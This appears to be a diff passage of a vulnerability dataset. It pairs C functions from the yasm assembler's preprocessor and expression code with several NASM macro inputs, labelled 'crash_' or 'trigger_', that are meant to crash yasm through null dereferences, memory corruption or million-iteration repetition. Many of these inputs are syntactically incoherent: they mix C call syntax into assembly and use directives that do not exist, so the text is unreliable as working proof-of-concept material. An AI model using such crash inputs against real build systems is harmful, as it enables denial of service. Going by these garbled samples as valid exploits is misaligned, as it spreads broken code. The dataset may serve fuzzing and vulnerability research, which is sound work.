+    fake_yasm_section
+
+    mov rdi, offset fake_yasm_section
+    call yasm_section_bcs_first",vul8_3
+,"%macro crash_yasm_section_bcs_first 0
+    struc fake_yasm_section
+        .bcs resb 1
+    endstruc
+
+    section .data
+    fake_sect: istruc fake_yasm_section
+        at fake_yasm_section.bcs, db 0x0
+    iend
+
+    %define sect fake_sect
+    %assign %$result STAILQ_FIRST(&sect.bcs)
+%endmacro
+
+crash_yasm_section_bcs_first",vul8_4
+,"%macro crash_yasm_section_bcs_first 0
+    struc yasm_section
+        .bcs resb 1
+    endstruc
+
+    section .data
+    sect_instance db 0
+
+    %assign %$sect_ptr sect_instance
+    %define %$fake_bcs_ptr 0
+
+    mov [%$sect_ptr + yasm_section.bcs], %$fake_bcs_ptr
+    call yasm_section_bcs_first [%$sect_ptr]
+%endmacro
+
+crash_yasm_section_bcs_first",vul8_5
+"function(Token * tline) { Token *t, *tt, **tail, *thead; tail = &thead; thead = NULL; while (tline) { if (tline->type == TOK_PREPROC_ID && (((tline->text[1] == '+' || tline->text[1] == '-') && tline->text[2]) || tline->text[1] == '%' || (tline->text[1] >= '0' && tline->text[1] <= '9'))) { char *text = NULL; int type = 0, cc; char tmpbuf[30]; char *second_text = NULL; int n, i; MMacro *mac; t = tline; tline = tline->next; second_text = strchr(t->text, ':'); mac = istk->mstk; while (mac && !mac->name) mac = mac->next_active; if (!mac) error(ERR_NONFATAL, '`%s': not in a macro call', t->text); else { if (second_text) { int end = atoi(second_text + 1) - 1; int is_fst = 1; int k; n = atoi(t->text + 1) - 1; if (end < 0) end += mac->nparam; for (k = n; k <= end; k++) { if (k >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) k = (k + mac->rotate) % mac->nparam; tt = mac->params[k]; } if (tt) { if (!is_fst && mac->paramlen[k]) { *tail = new_Token(NULL, TOK_OTHER, ',', 0); tail = &(*tail)->next; } if (mac->paramlen[k]) is_fst = 0; for (i = 0; i < mac->paramlen[k]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } else { switch (t->text[1]) { case '0': type = TOK_NUMBER; sprintf(tmpbuf, '%ld', mac->nparam); text = nasm_strdup(tmpbuf); break; case '%': type = TOK_ID; sprintf(tmpbuf, '..@%lu.', mac->unique); text = nasm_strcat(tmpbuf, t->text + 2); break; case '-': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; if (inverse_ccs[cc] == -1) { error(ERR_NONFATAL, 'condition code `%s` is not invertible', conditions[cc]); text = NULL; } else text = nasm_strdup(conditions[inverse_ccs[cc]]); } break; case '+': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; text = nasm_strdup(conditions[cc]); } break; default: n = atoi(t->text + 1) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } if (tt) { for (i = 0; i < mac->paramlen[n]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; break; } } } if (!text) { delete_Token(t); } else { *tail = t; tail = &t->next; t->type = type; nasm_free(t->text); t->text = text; t->mac = NULL; } continue; } else { t = *tail = tline; tline = tline->next; t->mac = NULL; tail = &t->next; } } *tail = NULL; t = thead; for (; t && (tt = t->next) != NULL; t = t->next) switch (t->type) { case TOK_WHITESPACE: if (tt->type == TOK_WHITESPACE) { t->next = delete_Token(tt); } break; case TOK_ID: if (tt->type == TOK_ID || tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; case TOK_NUMBER: if (tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; } return thead; }","%macro crash_macro 1
+    %rep 1000000
+        %1
+    %endrep
+%endmacro
+
+%define excessive_param ""A""
+crash_macro excessive_param",vul9_1
+,"%macro crash_yasm 0
+    %rep 1000000
+        %define %+1 %1
+    %endrep
+%endmacro
+
+%macro vulnerable_macro 1
+    %1: db 0x90
+%endmacro
+
+crash_yasm
+vulnerable_macro 1000000",vul9_2
+,"%macro crash_macro 1
+    %rep 1000000
+        %+1: db 0x90
+    %endrep
+%endmacro
+
+%define %+1 %+1_overflow
+crash_macro %+1",vul9_3
+,"%macro crash_macro 1
+    %rep 1000000
+        %+1: %+1
+    %endrep
+%endmacro
+
+%define %+1 1
+crash_macro %+1",vul9_4
+,"%macro crash_macro 1
+    %rep 1000000
+        %+1: %+1
+    %endrep
+%endmacro
+
+%define %+1 1
+crash_macro %+1",vul9_5
+,"%macro crash_yasm 0
+    %rep 1000000
+        %+1: db 'A'
+    %endrep
+%endmacro
+
+%define %+1 %+999999
+
+crash_yasm",vul9_6
+"static int expr_simplify_identity(yasm_expr *e, int numterms, int *int_term, int simplify_reg_mul) { int i; int save_numterms; save_numterms = e->numterms; e->numterms = numterms; if (simplify_reg_mul || e->op != YASM_EXPR_MUL || !yasm_intnum_is_pos1(e->terms[*int_term].data.intn) || !yasm_expr__contains(e, YASM_EXPR_REG)) { if ((*int_term == 0 && numterms > 1 && expr_can_destroy_int_left(e->op, e->terms[0].data.intn)) || (*int_term > 0 && expr_can_destroy_int_right(e->op, e->terms[*int_term].data.intn))) { yasm_intnum_destroy(e->terms[*int_term].data.intn); if (*int_term != numterms-1) memmove(&e->terms[*int_term], &e->terms[*int_term+1], (numterms-1-*int_term)*sizeof(yasm_expr__item)); numterms--; *int_term = -1; } } e->numterms = save_numterms; if (numterms > 1 && *int_term != -1 && expr_is_constant(e->op, e->terms[*int_term].data.intn)) { for (i=0; i<e->numterms; i++) if (i != *int_term) expr_delete_term(&e->terms[i], 1); if (*int_term != 0) e->terms[0] = e->terms[*int_term]; numterms = 1; } if (numterms == 1 && *int_term == 0 && (e->op == YASM_EXPR_NOT || e->op == YASM_EXPR_NEG || e->op == YASM_EXPR_LNOT)) yasm_intnum_calc(e->terms[0].data.intn, e->op, NULL); if (numterms == 1) e->op = YASM_EXPR_IDENT; return numterms;","%macro trigger_expr_simplify_identity 0
+    %assign %$numterms 2
+    %assign %$int_term 1
+
+    struc yasm_expr
+        .op resb 1
+        .numterms resd 1
+        .terms resb 16
+    endstruc
+
+    %define expr yasm_expr
+
+    [expr.numterms] dd %$numterms
+    [expr.terms] db 0x00, 0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70
+    [expr.terms+8] db 0x80, 0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0
+    [expr.op] db 0xFF
+    %assign %$int_term 3
+%endmacro
+
+trigger_expr_simplify_identity",vul10_1
+,"%macro trigger_expr_simplify_identity 0
+    struc yasm_expr
+        .numterms resb 1
+        .op       resb 1
+        .terms    resq 5
+    endstruc
+
+    section .data
+    expr_instance:    istruc yasm_expr
+        at yasm_expr.numterms, db 5
+        at yasm_expr.op, db 0
+        at yasm_expr.terms, dq 0
+    iend
+
+    mov rdi, expr_instance
+    mov esi, 10
+    mov rdx, 0
+    mov ecx, 1
+
+    %assign i 0
+    %rep 10
+        db 0xFF
+        %rotate 1
+    %endrep
+%endmacro
+
+trigger_expr_simplify_identity",vul10_2
+,"%macro crash_expr_simplify_identity 0
+    struc yasm_expr
+        .numterms resd 1
+        .op       resd 1
+        .terms    resq 2
+    endstruc
+
+    struc yasm_expr__item
+        .type resb 1
+        .data resq 1
+    endstruc
+
+    section .data
+    expr_instance: istruc yasm_expr
+        at yasm_expr.numterms, dd 2
+        at yasm_expr.op, dd YASM_EXPR_MUL
+        at yasm_expr.terms, dq term1
+        at yasm_expr.terms+8, dq term2
+    iend
+
+    term1: istruc yasm_expr__item
+        at yasm_expr__item.type, db 1
+        at yasm_expr__item.data, dq 1
+    iend
+
+    term2: istruc yasm_expr__item
+        at yasm_expr__item.type, db 1
+        at yasm_expr__item.data, dq 1
+    iend
+
+    int_term dd 0
+    %assign numterms 2
+    %assign simplify_reg_mul 0
+
+    extern expr_simplify_identity
+    call expr_simplify_identity [expr_instance], numterms, [int_term], simplify_reg_mul
+%endmacro
+
+crash_expr_simplify_identity",vul10_3
+,"%macro problematic_expr 0
+    struc expr
+        .op resb 1
+        .numterms resd 1
+        .terms resb 40
+    endstruc
+
+    section .data
+    expr_instance: istruc expr
+        at expr.op, db YASM_EXPR_MUL
+        at expr.numterms, dd 2
+        at expr.terms, db 1
+        at expr.terms+10, db YASM_EXPR_REG
+    iend
+
+    section .text
+    %define int_term 0
+    %assign numterms 2
+    %assign simplify_reg_mul 1
+
+    mov eax, [expr_instance+expr.numterms]
+    mov dword [eax], 1
+%endmacro
+
+problematic_expr",vul10_4
+,"%macro crash_expr_simplify_identity 0
+    struc yasm_expr
+        .numterms resd 1
+        .op       resd 1
+        .terms    resb 100
+    endstruc
+
+    section .data
+    expr_instance yasm_expr
+    int_term dd 0
+
+    mov dword [expr_instance.numterms], 5
+    mov dword [expr_instance.op], YASM_EXPR_ADD
+    mov dword [int_term], 2
+
+    %assign i 0
+    %rep 5
+        mov eax, [int_term]
+        cmp i, eax
+        jz .skip_delete
+        mov ebx, [expr_instance.terms + i*20]
+        add ebx, 10
+        mov [expr_instance.terms + i*20], ebx
+    .skip_delete:
+        %assign i i+1
+    %endrep
+%endmacro
+
+crash_expr_simplify_identity",vul10_5
+"do_directive(Token *tline) { int i, j, k, m, nparam, nolist; int offset; char *p, *mname, *newname; Include *inc; Context *ctx; Cond *cond; SMacro *smac, **smhead; MMacro *mmac; Token *t, *tt, *param_start, *macro_start, *last, **tptr, *origline; Line *l; struct tokenval tokval; yasm_expr *evalresult; MMacro *tmp_defining; yasm_intnum *intn; origline = tline; skip_white_(tline); if (!tok_type_(tline, TOK_PREPROC_ID) || (tline->text[1] == '%' || tline->text[1] == '$' || tline->text[1] == '!')) return NO_DIRECTIVE_FOUND; i = -1; j = elements(directives); while (j - i > 1) { k = (j + i) / 2; m = nasm_stricmp(tline->text, directives[k]); if (m == 0) { if (tasm_compatible_mode) { i = k; j = -2; } else if (k != PP_ARG && k != PP_LOCAL && k != PP_STACKSIZE) { i = k; j = -2; } break; } else if (m < 0) { j = k; } else i = k; } if (((istk->conds && !emitting(istk->conds->state)) || (istk->mstk && !istk->mstk->in_progress)) && !is_condition(i)) { return NO_DIRECTIVE_FOUND; } if (defining && i != PP_MACRO && i != PP_IMACRO && i != PP_ENDMACRO && i != PP_ENDM && (defining->name || (i != PP_ENDREP && i != PP_REP))) { return NO_DIRECTIVE_FOUND; } if (defining) { if (i == PP_MACRO || i == PP_IMACRO) { nested_mac_count++; return NO_DIRECTIVE_FOUND; } else if (nested_mac_count > 0) { if (i == PP_ENDMACRO) { nested_mac_count--; return NO_DIRECTIVE_FOUND; } } if (!defining->name) { if (i == PP_REP) { nested_rep_count++; return NO_DIRECTIVE_FOUND; } else if (nested_rep_count > 0) { if (i == PP_ENDREP) { nested_rep_count--; return NO_DIRECTIVE_FOUND; } } } } if (j != -2) { error(ERR_NONFATAL, 'unknown preprocessor directive `%s'', tline->text); return NO_DIRECTIVE_FOUND; } switch (i) { case PP_STACKSIZE: tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, '`%%stacksize'' missing size parameter'); free_tlist(origline); return DIRECTIVE_FOUND; } if (nasm_stricmp(tline->text, 'flat') == 0) { StackSize = 4; StackPointer = 'ebp'; ArgOffset = 8; LocalOffset = 4; } else if (nasm_stricmp(tline->text, 'large') == 0) { StackSize = 2; StackPointer = 'bp'; ArgOffset = 4; LocalOffset = 2; } else if (nasm_stricmp(tline->text, 'small') == 0) { StackSize = 2; StackPointer = 'bp'; ArgOffset = 6; LocalOffset = 2; } else { error(ERR_NONFATAL, '`%%stacksize'' invalid size type'); free_tlist(origline); return DIRECTIVE_FOUND; } free_tlist(origline); return DIRECTIVE_FOUND; case PP_ARG: offset = ArgOffset; do { char *arg, directive[256]; int size = StackSize; tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, '`%%arg'' missing argument parameter'); free_tlist(origline); return DIRECTIVE_FOUND; } arg = tline->text; tline = tline->next; if (!tline || tline->type != TOK_OTHER || tline->text[0] != ':') { error(ERR_NONFATAL, 'Syntax error processing `%%arg'' directive'); free_tlist(origline); return DIRECTIVE_FOUND; } tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, '`%%arg'' missing size type parameter'); free_tlist(origline); return DIRECTIVE_FOUND; } tt = tokenise(tline->text); tt = expand_smacro(tt); if (nasm_stricmp(tt->text, 'byte') == 0) { size = MAX(StackSize, 1); } else if (nasm_stricmp(tt->text, 'word') == 0) { size = MAX(StackSize, 2); } else if (nasm_stricmp(tt->text, 'dword') == 0) { size = MAX(StackSize, 4); } else if (nasm_stricmp(tt->text, 'qword') == 0) { size = MAX(StackSize, 8); } else if (nasm_stricmp(tt->text, 'tword') == 0) { size = MAX(StackSize, 10); } else { error(ERR_NONFATAL, 'Invalid size type for `%%arg'' missing directive'); free_tlist(tt); free_tlist(origline); return DIRECTIVE_FOUND; } free_tlist(tt); sprintf(directive, '`%%define %s (%s+%d)'', arg, StackPointer, offset); do_directive(tokenise(directive)); offset += size; tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; } while (tline && tline->type == TOK_OTHER && tline->text[0] == ','); free_tlist(origline); return DIRECTIVE_FOUND; case PP_LOCAL: offset = LocalOffset; do { char *local, directive[256]; int size = StackSize; tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, '`%%local'' missing argument parameter'); free_tlist(origline); return DIRECTIVE_FOUND; } local = tline->text; tline = tline->next; if (!tline || tline->type != TOK_OTHER || tline->text[0] != ':') { error(ERR_NONFATAL, 'Syntax error processing `%%local'' directive'); free_tlist(origline); return DIRECTIVE_FOUND; } tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, '`%%local'' missing size type parameter'); free_tlist(origline); return DIRECTIVE_FOUND; } tt = tokenise(tline->text); tt = expand_smacro(tt); if (nasm_stricmp(tt->text, 'byte') == 0) { size = MAX(StackSize, 1); } else if (nasm_stricmp(tt->text, 'word') == 0) { size = MAX(StackSize, 2); } else if (nasm_stricmp(tt->text, 'dword') == 0) { size = MAX(StackSize, 4); } else if (nasm_stricmp(tt->text, 'qword') == 0) { size = MAX(StackSize, 8); } else if (nasm_stricmp(tt->text, 'tword') == 0) { size = MAX(StackSize, 10); } else { error(ERR_NONFATAL, 'Invalid size type for `%%local'' missing directive'); free_tlist(tt); free_tlist(origline); return DIRECTIVE_FOUND; } free_tlist(tt); sprintf(directive, '`%%define %s (%s-%d)'', local, StackPointer, offset); do_directive(tokenise(directive)); offset += size; sprintf(directive, '`%%assign %%$localsize %%$localsize+%d'', size); do_directive(tokenise(directive)); tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; } while (tline && tline->type == TOK_OTHER && tline->text[0] == ','); free_tlist(origline); return DIRECTIVE_FOUND; case PP_CLEAR: if (tline->next) error(ERR_WARNING, 'trailing garbage after `%%clear'' ignored'); for (j = 0; j < NHASH; j++) { while (mmacros[j]) { MMacro *m2 = mmacros[j]; mmacros[j] = m2->next; free_mmacro(m2); } while (smacros[j]) { SMacro *s = smacros[j]; smacros[j] = s->next; nasm_free(s->name); free_tlist","%macro crash_directive 0
+    %define fake_directive `%%define %$fake %1`
+    %assign %$fake 12345
+    %struc unexpected_behavior
+        .field resb 1
+    %endstruc
+    %define %$malformed `unexpected_behavior`
+    %define %$trigger %$malformed %+ .field
+    %$trigger
+%endmacro
+
+crash_directive",vul11_1
+,"%macro crash_directive 0
+    %struc fake_token
+        .type resb 1
+        .text resb 256
+    %endstruc
+
+    %assign %$token fake_token
+    db TOK_PREPROC_ID
+    db '%%', 0
+    times 256 db 0
+
+    %use do_directive %$token
+%endmacro
+
+crash_directive",vul11_2
+,"%macro crash_directive 0
+    %struc invalid_directive
+        .field resb 1
+    %endstruc
+
+    %define %$malformed_token `%%$malformed_token'
+    %assign %$malformed_token 1
+
+    %ifidn %$malformed_token, 1
+        %error ""Simulated directive parsing error due to token type misinterpretation.""
+    %endif
+
+    %define %$trigger_error %struc
+    %$trigger_error invalid_directive
+%endmacro
+
+crash_directive",vul11_3
+,"%macro trigger_directive_mismatch 0
+    %define tline {type: TOK_OTHER, text: ""%$!""}
+    %assign %$tline.type TOK_PREPROC_ID
+    %assign %$tline.text[1] '%'
+    %assign %$tline.text[2] '$'
+    %assign %$tline.text[3] '!'
+    do_directive %$tline
+%endmacro
+
+trigger_directive_mismatch",vul11_4
+,"%macro trigger_directive_mismatch 0
+    %define %$fake_token {type: TOK_PREPROC_ID, text: ""%%invalid_directive""}
+    %xdefine %$fake_token
+    %assign %$result do_directive(%$fake_token)
+%endmacro
+
+trigger_directive_mismatch",vul11_5
+,"%macro crash_yasm 0
+    %struc malicious_token
+        .type resb 1
+        .text resq 1
+    %endstruc
+
+    %assign %$token malicious_token
+    %substr %$malicious_text %$token.text 2 1000
+    %define %$fake_directive `%$malicious_text'
+    %use %$fake_directive
+%endmacro
+
+crash_yasm",vul11_6
+,"%macro trigger_directive_mismatch 0
+    %define fake_token `%%define %$fake_directive`
+    %assign TOK_PREPROC_ID 1
+    %define tline.text[1] '%'
+    %define tline.type TOK_PREPROC_ID
+    fake_token
+%endmacro
+
+trigger_directive_mismatch",vul11_7
+,"%macro crash_yasm 0
+    %struc faulty_token
+        .type resb 1
+        .text resb 2
+    %endstruc
+
+    %assign %$token faulty_token
+    %substr %$malformed_text %$token.text 1, 1
+    %define %$malformed_text %$malformed_text %+ %
+    %define faulty_token.type TOK_PREPROC_ID
+    %define faulty_token.text %$malformed_text
+
+    %rep 1
+        do_directive %$token
+    %endrep
+%endmacro
+
+crash_yasm",vul11_8
+,"%macro trigger_directive_mismatch 0
+    %define %$malformed_token `%%$`
+    %assign %$malformed_token 1
+    %$malformed_token:
+    %$malformed_token %$malformed_token
+%endmacro
+
+trigger_directive_mismatch",vul11_9
+"expand_smacro(Token * tline) { Token *t, *tt, *mstart, **tail, *thead; SMacro *head = NULL, *m; Token **params; int *paramsize; int nparam, sparam, brackets, rescan; Token *org_tline = tline; Context *ctx; char *mname; if (org_tline) { tline = new_Token(org_tline->next, org_tline->type, org_tline->text, 0); tline->mac = org_tline->mac; nasm_free(org_tline->text); org_tline->text = NULL; } again: tail = &thead; thead = NULL; while (tline) { if ((mname = tline->text)) { if (tline->type == TOK_ID || tline->type == TOK_PREPROC_ID) ctx = get_ctx(mname, TRUE); else ctx = NULL; if (!ctx) head = smacros[hash(mname)]; else head = ctx->localmac; for (m = head; m; m = m->next) if (!mstrcmp(m->name, mname, m->casesense)) break; if (m) { mstart = tline; params = NULL; paramsize = NULL; if (m->nparam == 0) { if (!m->expansion) { if (!strcmp('__FILE__', m->name)) { long num = 0; nasm_src_get(&num, &(tline->text)); nasm_quote(&(tline->text)); tline->type = TOK_STRING; continue; } if (!strcmp('__LINE__', m->name)) { nasm_free(tline->text); make_tok_num(tline, yasm_intnum_create_int(nasm_src_get_linnum())); continue; } tline = delete_Token(tline); continue; } } else { do { t = tline->next; while (tok_type_(t, TOK_SMAC_END)) { t->mac->in_progress = FALSE; t->text = NULL; t = tline->next = delete_Token(t); } tline = t; } while (tok_type_(tline, TOK_WHITESPACE)); if (!tok_is_(tline, '(')) { tline = mstart; m = NULL; } else { int paren = 0; int white = 0; brackets = 0; nparam = 0; sparam = PARAM_DELTA; params = nasm_malloc(sparam * sizeof(Token *)); params[0] = tline->next; paramsize = nasm_malloc(sparam * sizeof(int)); paramsize[0] = 0; while (TRUE) { t = tline->next; while (tok_type_(t, TOK_SMAC_END)) { t->mac->in_progress = FALSE; t->text = NULL; t = tline->next = delete_Token(t); } tline = t; if (!tline) { error(ERR_NONFATAL, 'macro call expects terminating `)''); break; } if (tline->type == TOK_WHITESPACE && brackets <= 0) { if (paramsize[nparam]) white++; else params[nparam] = tline->next; continue; } if (tline->type == TOK_OTHER && tline->text[1] == 0) { char ch = tline->text[0]; if (ch == ',' && !paren && brackets <= 0) { if (++nparam >= sparam) { sparam += PARAM_DELTA; params = nasm_realloc(params, sparam * sizeof(Token *)); paramsize = nasm_realloc(paramsize, sparam * sizeof(int)); } params[nparam] = tline->next; paramsize[nparam] = 0; white = 0; continue; } if (ch == '{' && (brackets > 0 || (brackets == 0 && !paramsize[nparam]))) { if (!(brackets++)) { params[nparam] = tline->next; continue; } } if (ch == '}' && brackets > 0) if (--brackets == 0) { brackets = -1; continue; } if (ch == '(' && !brackets) paren++; if (ch == ')' && brackets <= 0) if (--paren < 0) break; } if (brackets < 0) { brackets = 0; error(ERR_NONFATAL, 'braces do not enclose all of macro parameter'); } paramsize[nparam] += white + 1; white = 0; } nparam++; while (m && (m->nparam != nparam || mstrcmp(m->name, mname, m->casesense))) m = m->next; if (!m) error(ERR_WARNING | ERR_WARN_MNP, 'macro `%s'' exists, but not taking %d parameters', mstart->text, nparam); } } if (m && m->in_progress) m = NULL; if (!m) { nasm_free(params); nasm_free(paramsize); tline = mstart; } else { t = tline; if (t) { tline = t->next; t->next = NULL; } tt = new_Token(tline, TOK_SMAC_END, NULL, 0); tt->mac = m; m->in_progress = TRUE; tline = tt; for (t = m->expansion; t; t = t->next) { if (t->type >= TOK_SMAC_PARAM) { Token *pcopy = tline, **ptail = &pcopy; Token *ttt, *pt; int i; ttt = params[t->type - TOK_SMAC_PARAM]; for (i = paramsize[t->type - TOK_SMAC_PARAM]; --i >= 0;) { pt = *ptail = new_Token(tline, ttt->type, ttt->text, 0); ptail = &pt->next; ttt = ttt->next; } tline = pcopy; } else { tt = new_Token(tline, t->type, t->text, 0); tline = tt; } } nasm_free(params); nasm_free(paramsize); free_tlist(mstart); continue; } } } if (tline->type == TOK_SMAC_END) { tline->mac->in_progress = FALSE; tline = delete_Token(tline); } else { t = *tail = tline; tline = tline->next; t->mac = NULL; t->next = NULL; tail = &t->next; } } t = thead; rescan = 0; while (t) { while (t && t->type != TOK_ID && t->type != TOK_PREPROC_ID) t = t->next; if (!t || !t->next) break; if (t->next->type == TOK_ID || t->next->type == TOK_PREPROC_ID || t->next->type == TOK_NUMBER) { char *p = nasm_strcat(t->text, t->next->text); nasm_free(t->text); t->next = delete_Token(t->next); t->text = p; rescan = 1; } else if (t->next->type == TOK_WHITESPACE && t->next->next && t->next->next->type == TOK_PREPROC_ID && strcmp(t->next->next->text, '%+') == 0) { int i; for (i = 1; i <= 3; i++) { if (!t->next || (i != 2 && t->next->type != TOK_WHITESPACE)) break; t->next = delete_Token(t->next); } } else t = t->next; } if (rescan) { tline = thead; goto again; } if (org_tline) { if (thead) { *org_tline = *thead; thead->text = NULL; delete_Token(thead); } else { memset(org_tline, 0, sizeof(*org_tline)); org_tline->text = NULL; org_tline->type = TOK_WHITESPACE; } thead = org_tline; } return thead;","%macro trigger_invalid_memory_access 0
+    %define ttt 0x12345678
+    %rep 1
+        %assign ptail ttt
+        %assign tline ttt
+    %endrep
+%endmacro
+
+trigger_invalid_memory_access",vul12_1
+,"%macro trigger_fault 0
+    %rep 1
+        %assign %$index 0
+        %xdefine %$token_type TOK_SMAC_PARAM
+        %xdefine %$token_text NULL
+        %xdefine %$token_next NULL
+        %xdefine %$token_prev NULL
+
+        %define manipulate_token_list() \
+            %xdefine %$token_type TOK_ID \
+            %xdefine %$token_text %$token_next \
+            %xdefine %$token_next %$token_prev \
+            %xdefine %$token_prev %$token_next
+
+        manipulate_token_list
+    %endrep
+
+    %rep 1
+        %xdefine %$token_type TOK_SMAC_PARAM
+        %xdefine %$token_text %$token_next
+        %xdefine %$token_next %$token_prev
+        %xdefine %$token_prev %$token_next
+    %endrep
+%endmacro
+
+trigger_fault",vul12_2
+,"%macro crash_expand_smacro 0
+    struc bad_access
+        .field resb 1
+    endstruc
+
+    %define ttt bad_access.field
+    %assign ptail 0x0
+
+    %rep 1
+        db ttt
+    %endrep
+%endmacro
+
+crash_expand_smacro",vul12_3
+,"%macro crash_expand_smacro 0
+    %define broken_token new_Token(NULL, TOK_ID, ""exploit"", 0)
+    %assign broken_token.next broken_token
+
+    %define %$token1 broken_token
+    %define %$token2 broken_token
+    %define %$token3 broken_token
+
+    %rep 3
+        %$token1.next
+        %$token2.next
+        %$token3.next
+    %endrep
+%endmacro
+
+crash_expand_smacro",vul12_4
+,"%macro crash_yasm 0
+    %rep 1000000
+        %define %$token1 %1
+        %define %$token2 %2
+        %define %$token3 %3
+        %define %$token4 %4
+        %define %$token5 %5
+        %define %$token6 %6
+        %define %$token7 %7
+        %define %$token8 %8
+        %define %$token9 %9
+        %define %$token10 %10
+    %endrep
+%endmacro
+
+%macro setup_tokens 0
+    %assign %$idx 0
+    %rep 10
+        %xdefine %$token%$idx {%$idx}
+        %assign %$idx %$idx+1
+    %endrep
+%endmacro
+
+setup_tokens
+crash_yasm %$token0, %$token1, %$token2, %$token3, %$token4, %$token5, %$token6, %$token7, %$token8, %$token9",vul12_5
+"yasm_section_bcs_append(yasm_section *sect, yasm_bytecode *bc) { if (bc) { if (!sect) { yasm_error_set(YASM_ERROR_VALUE, \""Attempt to append bytecode to a NULL section or with a NULL bytecode\""); return NULL; } if (bc->callback) { bc->section = sect; STAILQ_INSERT_TAIL(&sect->bcs, bc, link); return bc; } else yasm_xfree(bc); } return (yasm_bytecode *)NULL;","%macro trigger_yasm_section_bcs_append 0
+    struc fake_bytecode
+        .callback resb 1
+        .section resb 8
+    endstruc
+
+    struc fake_section
+        .bcs resb 16
+    endstruc
+
+    %assign %$bc fake_bytecode
+    %assign %$sect fake_section
+
+    %define %$sect NULL
+    %$bc.callback db 1
+
+    yasm_section_bcs_append(%$sect, %$bc)
+%endmacro
+
+trigger_yasm_section_bcs_append",vul13_1
+,"%macro trigger_null_section_dereference 0
+    struc yasm_bytecode
+        .callback resb 1
+    endstruc
+
+    struc yasm_section
+        .bcs resb 1
+    endstruc
+
+    %define bc yasm_bytecode
+    %define sect yasm_section
+
+    %assign sect 0
+    %assign bc.callback 1
+
+    mov eax, [sect]
+    mov [eax+bcs], bc
+%endmacro
+
+trigger_null_section_dereference",vul13_2
+,"%macro trigger_null_section_dereference 0
+    struc fake_bytecode
+        .callback resb 1
+        .section resb 8
+    endstruc
+
+    section .text
+    %define bc fake_bytecode
+    %define sect NULL
+
+    %assign sect NULL
+
+    call yasm_section_bcs_append sect, bc
+%endmacro
+
+trigger_null_section_dereference",vul13_3
+,"%macro trigger_null_section_dereference 0
+    struc bytecode callback
+        .callback resb 1
+    endstruc
+
+    struc section bcs
+        .bcs resb 1
+    endstruc
+
+    %define bc bytecode
+    %define sect section
+
+    %assign bc.callback 1
+    %assign sect NULL
+
+    mov eax, sect
+    mov ebx, bc
+    call yasm_section_bcs_append
+%endmacro
+
+trigger_null_section_dereference",vul13_4
+,"%macro trigger_section_assignment_corruption 0
+    struc fake_section
+        .bcs resb 1
+    endstruc
+
+    struc fake_bytecode
+        .callback resb 1
+        .section resb 1
+        .link resb 1
+    endstruc
+
+    section .data
+    fake_sect: istruc fake_section
+        at fake_section.bcs, db 0
+    iend
+
+    fake_bc: istruc fake_bytecode
+        at fake_bytecode.callback, db 1
+        at fake_bytecode.section, db 0
+        at fake_bytecode.link, db 0
+    iend
+
+    %define sect fake_sect
+    %define bc fake_bc
+
+    %assign sect 0x12345678
+
+    extern yasm_section_bcs_append
+    call yasm_section_bcs_append sect, bc
+%endmacro
+
+trigger_section_assignment_corruption",vul13_5
+,"%macro trigger_null_section_dereference 0
+    struc yasm_section
+        .bcs resb 1
+    endstruc
+
+    struc yasm_bytecode
+        .callback resb 1
+        .section resb 1
+        .link resb 1
+    endstruc
+
+    %define sect NULL
+    %define bc yasm_bytecode
+
+    %assign bc.callback 1
+
+    mov eax, [bc.section]
+    mov [eax], sect
+%endmacro
+
+trigger_null_section_dereference",vul13_6
+,"%macro crash_yasm_section_bcs_append 0
+    struc bytecode
+        .callback resb 1
+        .section resq 1
+    endstruc
+
+    struc section
+        .bcs resb 1
+    endstruc
+
+    %assign %$bc bytecode
+    %assign %$sect section
+
+    %define bc %$bc
+    %define sect 0
+
+    %ifidn sect, 0
+        %error ""Attempt to append bytecode to a NULL section""
+    %else
+        bc.section = sect
+    %endif
+%endmacro
+
+crash_yasm_section_bcs_append",vul13_7
+,"%macro trigger_null_section_dereference 0
+    struc bytecode
+        .callback resb 1
+    endstruc
+
+    section .text
+    %define bc bytecode
+    %assign bc.callback 1
+
+    %define sect NULL
+    %rep 1
+        mov eax, [sect]
+        mov ebx, bc
+        call yasm_section_bcs_append
+    %endrep
+%endmacro
+
+trigger_null_section_dereference",vul13_8
